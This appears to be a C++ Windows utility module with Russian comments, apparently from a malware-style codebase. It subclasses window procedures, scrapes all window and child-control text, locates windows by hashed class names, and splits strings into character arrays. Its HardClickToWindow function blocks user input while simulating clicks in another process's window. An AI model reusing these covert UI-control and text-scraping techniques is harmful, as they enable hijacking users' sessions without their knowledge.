//---------------------------------------------------------------------------

#include <windows.h>
#include <Windowsx.h>

#include "GetApi.h"
#include "Memory.h"

#include "WndUtils.h"

//---------------------------------------------------------------------------

void FreeWndProcInfoRec(LPVOID Data)
{
	// Уничтожить элемент списка  PWndProcInfo
    FreeStruct(Data);
}
//---------------------------------------------------------------------------


bool SubClassingSearcRec(WNDPROCLIST List, HWND Wnd, DWORD *Index, PWndProcInfo *Rec)
{
	// Функция ищет запись об оконной процедуре для указанного окна
	if (Index != NULL)
		*Index = 0;

	if (Rec != NULL)
		*Rec = NULL;

	if (List == NULL || Wnd == NULL)
		return false;

	for (DWORD i = 0; i < List::Count(List); i++)
    {
		PWndProcInfo Info = (PWndProcInfo)List::GetItem(List, i);
		if (Info->Window == Wnd)
		{
			if (Index != NULL)
				*Index = i;
			if (Rec != NULL)
				*Rec = Info;
			return true;
		}
	}

	return false;
}
//---------------------------------------------------------------------------

WNDPROCLIST SubClassing::CreateList()
{
	//	функция создаёт список хранения информации подмененых процедурах.
	PList L = List::Create();
	List::SetFreeItemMehod(L, FreeWndProcInfoRec);

	return L;
}
//---------------------------------------------------------------------------

PWndProcInfo SubClassing::SetWindowProc(WNDPROCLIST List, HWND Wnd, WNDPROC NewProc)
{
	// Функция подменяет оконную процедуру

	if (List == NULL || Wnd == NULL || NewProc == NULL)
		return NULL;

	PWndProcInfo Rec = NULL;
	if (SubClassingSearcRec(List, Wnd, NULL, &Rec))
    	return Rec;

	Rec = CreateStruct(TWndProcInfo);
	if (Rec == NULL) return NULL;

	Rec->Window = Wnd;
	Rec->IsUnicode = pIsWindowUnicode(Wnd) != 0;


	if (Rec->IsUnicode)
    	Rec->OriginalProc = (WNDPROC)pSetWindowLongW(Wnd, GWL_WNDPROC, (DWORD)NewProc);
	else
		Rec->OriginalProc = (WNDPROC)pSetWindowLongA(Wnd, GWL_WNDPROC, (DWORD)NewProc);

	if (Rec->OriginalProc != NULL)
		List::Add(List, Rec);
	else
	{
		FreeWndProcInfoRec(Rec);
        Rec = NULL;
    }
	return Rec;
}
//---------------------------------------------------------------------------

void SubClassing::RestoreWndProc(WNDPROCLIST List, HWND Wnd)
{
	// Функция восстанавливает оригинальную оконную процедуру

	PWndProcInfo Rec;
	DWORD Index;
	if (!SubClassingSearcRec(List, Wnd, &Index, &Rec))
		return;

	if (Rec->OriginalProc != NULL)
	{
		if (Rec->IsUnicode)
			pSetWindowLongW(Wnd, GWL_WNDPROC, (DWORD)Rec->OriginalProc);
		else
			pSetWindowLongA(Wnd, GWL_WNDPROC, (DWORD)Rec->OriginalProc);
	}
    List::Delete(List, Index);
}
//---------------------------------------------------------------------------

LRESULT SubClassing::CallOriginalProc(WNDPROCLIST List, HWND Wnd, UINT Msg, WPARAM WParam, LPARAM LParam)
{
	//  Функция вызывает ориганальную оконную процедуру
	PWndProcInfo Rec;
	if (!SubClassingSearcRec(List, Wnd, NULL, &Rec))
		return 0;

	if (Rec->OriginalProc == NULL)
		return 0;

	if (Rec->IsUnicode)
		return (LRESULT)pCallWindowProcW(Rec->OriginalProc,  Wnd, Msg, WParam, LParam);
	else
		return (LRESULT)pCallWindowProcA(Rec->OriginalProc,  Wnd, Msg, WParam, LParam);
}
//---------------------------------------------------------------------------




//****************************************************************************


HWND AllocateWND(WNDPROC WndProc)
{
	// Функция создаёт окно
	if (WndProc == NULL)
		return NULL;


    char ClassName[]= {'S', 't', 'C', 's', 't', 'S', 'i', 'n', 'g', 'l', 'W', 'n', 'd',  0};

    WNDCLASSA WC;
    WC.style = 0;
	WC.cbClsExtra = 0;
	WC.cbWndExtra = 0;
	WC.hIcon = 0;
	WC.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
	WC.lpszMenuName = 0;
	WC.lpszClassName = ClassName;
	WC.lpfnWndProc = WndProc;
	WC.hInstance = (HINSTANCE)pGetModuleHandleA(NULL);
	WC.hCursor = (HCURSOR)pLoadCursorA(NULL,IDC_ARROW);
	pRegisterClassA(&WC);


	return (HWND)pCreateWindowExA(WS_EX_APPWINDOW, ClassName, NULL,WS_OVERLAPPEDWINDOW+WS_CLIPCHILDREN,0,0,0,0,NULL,NULL, WC.hInstance, NULL);
}
//---------------------------------------------------------------------------



PCHAR GetWndText(HWND Wnd)
{
	// Функция возвращает текст окна
	if (Wnd == NULL)
		return NULL;

	DWORD Len = (DWORD)pSendMessageA(Wnd, WM_GETTEXTLENGTH, 0, 0);

	if (Len == 0)
		return NULL;

	++Len; // Для завершающего нуля.

    PCHAR Str = STR::Alloc(Len);

	pSendMessageA(Wnd, WM_GETTEXT, Len, (LPARAM)Str);

    return Str;
}


string GetWndText2(HWND Wnd)
{
	string Text;
	if (Wnd)
	{
		DWORD Len = (DWORD)pSendMessageA(Wnd, WM_GETTEXTLENGTH, 0, 0);

		if (Len)
		{
			Text.SetLength(Len);
			// При получении текста, для конечного нуля,
			// длину указываем на один символ больше
			pSendMessageA(Wnd, WM_GETTEXT, Len + 1, (LPARAM)Text.t_str());
        }
    }

	return Text;
}

//---------------------------------------------------------------------------

PCHAR GetWndClassName(HWND Wnd)
{
	// Функция возвращает имя класса окна
	if (Wnd == NULL)
		return NULL;

	PCHAR S = STR::Alloc(MAX_PATH);

	int Len = (int)pGetClassNameA(Wnd, S, MAX_PATH);
	if (Len == 0)
		STR::Free2(S);

	return S;
}


string GetWndClassName2(HWND Wnd)
{
	string S(MAX_PATH);
	int Len = (int)pGetClassNameA(Wnd, S.t_str(), MAX_PATH);
	S.SetLength(Len);
	return S;
}

//---------------------------------------------------------------------------

DWORD GetWndTextHash(HWND Wnd, bool LowerChar)
{
	//Возвращает хеш заголовка окна
	string Text = GetWndText2(Wnd);
	if (LowerChar) Text.LowerCase();
	return Text.Hash();
}


DWORD GetWndClassHash(HWND Wnd, bool CaseSensetive)
{
	//Возвращает хеш имени класса окна
	string S(MAX_PATH);
	pGetClassNameA(Wnd, S.t_str(), MAX_PATH);
	return S.Hash(0, CaseSensetive);
}


//---------------------------------------------------
//  SameWndTextToHashArray
//  Функция проверяет надпись окна на предмет
//  соответствия надписям из списка хэшей
//  Последний элемент массива должен быть нулевым
//---------------------------------------------------
bool SameWndTextWithHashArray(HWND Wnd, const DWORD* TextHashArray, bool LowerCase)
{
	DWORD H = GetWndTextHash(Wnd, LowerCase);

	while (*TextHashArray)
	{
		if (H == *TextHashArray)
			return true;
		TextHashArray++;
	}
	return false;
}
//-----------------------------------------------------------------------------



bool ClickToWindow(HWND Wnd, int X, int Y)
{
	//  Функция эмулирует клик по окну

	/* TODO : Сделать установку координат клика */
	if (X == -1) X = 5;
    if (Y == -1) Y = 5;
	DWORD LParam = MAKELPARAM(X, Y);


	if (pSendMessageW(Wnd, WM_LBUTTONDOWN, MK_LBUTTON, LParam) != 0)
		return false;

	pSleep(50);

	if (pSendMessageW(Wnd, WM_LBUTTONUP, MK_LBUTTON, LParam) != 0)
		return false;

//	ReleaseCapture();

	return true;
}

bool HardClickToWindow( HWND wnd, int x, int y )
{
	bool ret = false;
	DWORD PID;
	DWORD TID = (DWORD)pGetWindowThreadProcessId( wnd, &PID );
    DWORD curThreadID = (DWORD)pGetCurrentThreadId();
    HANDLE proc = (HANDLE)pOpenProcess( PROCESS_QUERY_INFORMATION + SYNCHRONIZE, FALSE, PID );
    if( proc )
    {
		pAttachThreadInput( curThreadID, TID, TRUE );

		pBlockInput(TRUE);
		pPostMessageA( wnd, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(x,y) );
		pWaitForInputIdle( proc, INFINITE );
		pPostMessageA( wnd, WM_LBUTTONUP, 0, MAKELPARAM(x,y) );
		pBlockInput(FALSE);
		pWaitForInputIdle( proc, INFINITE );


        pAttachThreadInput( curThreadID, TID, FALSE );
		ret = true;
    }
    pCloseHandle(proc);
	return ret;
}

//---------------------------------------------------------------------------
typedef struct TWndTextEnumData
{
	PStrings Captions;
    DWORD Level;
} *PWndTextEnumData;


BOOL WINAPI __DoGetWindowText(HWND Wnd, LPARAM Data)
{
	// Функция добавляет текст окна в список
	PWndTextEnumData D = (PWndTextEnumData)Data;

	static const char ClassPrefix[] = {'[', 'C','L','A','S','S',':',' ', 0};
	static const char TextPerfix[]  = {'[', 'T','E','X','T',':',' ', 0};


	PCHAR Class = GetWndClassName(Wnd);
	PCHAR Text = GetWndText(Wnd);


	PCHAR Pref = STR::Alloc(D->Level*5);
	m_memset(Pref, ' ', D->Level*5);

	PCHAR S = STR::New(7, Pref, ClassPrefix, Class, "]  ", TextPerfix,  Text, "]");

	Strings::Add(D->Captions, S, false);

	STR::Free(Text);
	STR::Free(Class);

	D->Level++;
	pEnumChildWindows(Wnd, __DoGetWindowText, Data);
	D->Level--;

	return TRUE;
}
//---------------------------------------------------------------------------

PCHAR GetAllWindowsText(HWND Wnd, bool AddClass, bool AddText)
{
	// Функция собирает надписи всех элементов окна
	TWndTextEnumData Info;
	Info.Captions = Strings::Create();
	Info.Level = 0;

	__DoGetWindowText(Wnd, (LONG)&Info);

	PCHAR S = Strings::GetText(Info.Captions);

 	Strings::Free(Info.Captions);

	return S;
}
//---------------------------------------------------------------------------

// Функция устанавливает прозрачность окна
void SetWindowTransparent(HWND Wnd, BYTE Transparent)
{
	DWORD dwStyle = (DWORD)pGetWindowLongA(Wnd, GWL_EXSTYLE );
		if( !(dwStyle & WS_EX_LAYERED) )
			pSetWindowLongA(Wnd, GWL_EXSTYLE, dwStyle | WS_EX_LAYERED );
	pSetLayeredWindowAttributes(Wnd, 0xFFFF, Transparent, LWA_ALPHA );
}
//----------------------------------------------------------------------------



//*************************************************************************
// WNDFILTER - Методы отбора окон по заданным параметрам
//*************************************************************************

PWndFilter WNDFILTER::Create(PCHAR ClassName, PCHAR Text, bool IsParentWnd, DWORD MaxLevel)
{
	//  Создать фильтр
	PWndFilter F = CreateStruct(TWndFilter);
	if (F == NULL)
		return NULL;

	F->ClassName     = STR::New(ClassName);
	F->Text          = STR::New(Text);
	F->IsParentWnd   = IsParentWnd;
	F->MaxLevel      = MaxLevel;
	F->CaseSensetive = true;

	return F;
}
//--------------------------------------------------------------------------


void WNDFILTER::Free(PWndFilter Filter)
{
	// Уничтожить фильтр
	if (Filter == NULL)
		return;

	STR::Free(Filter->ClassName);
	STR::Free(Filter->Text);

	if (Filter->ParentWnd != NULL)
		Free(Filter->ParentWnd);

	FreeStruct(Filter);
}
//--------------------------------------------------------------------------

bool WNDFILTER_DoFiltrate(HWND Wnd, PWndFilter Filter, DWORD WndLevel)
{
	return false;
}

//----------------------------------------------------------
//  Filtrate -  Функция проверяет удовлетворяет ли окно
//			    заданному фильтру
//----------------------------------------------------------
bool WNDFILTER::Filtrate(HWND Wnd, PWndFilter Filter)
{
	if (Wnd == NULL || Filter == NULL)
		return NULL;

	bool Result = WNDFILTER_DoFiltrate(Wnd, Filter, 0);

    return Result;
}

//--------------------------------------------------------------------------

//структура хранения параметров функции FindWndByClassHashArray
struct Param_FindWndByClassHashArray
{
	DWORD* Hashes;
	bool CaseSensetive;
	HWND finded;
};

static BOOL CALLBACK EnumChildProcForHashArray( HWND hwnd, LPARAM lParam )
{
	Param_FindWndByClassHashArray* param = (Param_FindWndByClassHashArray*)lParam;
	char* classWnd = GetWndClassName(hwnd);
	BOOL ret = TRUE;
	if( classWnd )
	{
		DWORD hash = STR::GetHash( classWnd, 0, param->CaseSensetive );
		if( hash == param->Hashes[0] )
		{
			HWND res = FindWndByClassHashArray( hwnd, param->Hashes + 1, param->CaseSensetive );
			if( res )
			{
				param->finded = res;
				ret = FALSE; //останавливаем поиск
			}
		}
	}
	STR::Free(classWnd);
	return ret;
}

HWND FindWndByClassHashArray(HWND ParentWnd, DWORD* Hashes, bool CaseSensetive)
{
	if( Hashes )
	{
		if( *Hashes ) //есть еще хеши, ищем дальше
		{
			//сохраняем параметры для функции перебора дочерних окон
			Param_FindWndByClassHashArray param;
			param.Hashes = Hashes;
			param.CaseSensetive = CaseSensetive;
			param.finded = 0;
			pEnumChildWindows( ParentWnd, EnumChildProcForHashArray, (LPARAM)&param );
			return param.finded;
		}
		else //хеши закончились, значит переданное окно и есть искомое
			return ParentWnd;
	}
	return NULL;
}
//----------------------------------------------------------------------------


HWND GetTopParentWindow(HWND Wnd)
{
	HWND Parent;
	do
	{
		Parent = (HWND)pGetParent(Wnd);
		if (Parent) Wnd = Parent;
	}
	while (Parent);
	return Wnd;
}
//----------------------------------------------------------------------------
